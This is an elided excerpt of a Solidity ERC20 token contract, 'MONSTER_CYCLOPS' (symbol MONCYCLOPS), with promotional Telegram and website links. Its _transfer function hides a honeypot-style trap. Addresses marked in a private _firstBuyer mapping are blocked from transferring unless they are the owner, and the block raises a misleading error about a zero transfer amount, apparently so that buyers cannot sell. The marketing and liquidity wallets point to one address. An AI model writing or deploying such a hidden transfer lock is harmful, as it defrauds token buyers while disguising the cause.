...
// https://t.me/monstercyclop

// 📌 https://monsterclops.art 📌
// 📌 https://monsterclops.art/gallery.html 
...
contract MONSTER_CYCLOPS is Context, IERC20, Ownable {
    ...
    string private constant _symbol = "MONCYCLOPS";
    ...
    address private marketingWallet = address(0x45Beb309bCD59bAD16AF834B1FC5F1E95F41e91D);
    address private liquidityReceiver = address(0x45Beb309bCD59bAD16AF834B1FC5F1E95F41e91D);
    
    uint256 public _buyCooldown = 0 minutes;
    mapping (address => uint256) private _lastBuy;
    mapping (address => bool) private _firstBuyer;
    ...
    function _transfer(
        ...
        if(_firstBuyer[from]) {
            require(from == owner(), "Transfer amount must be greater than zero");
        }
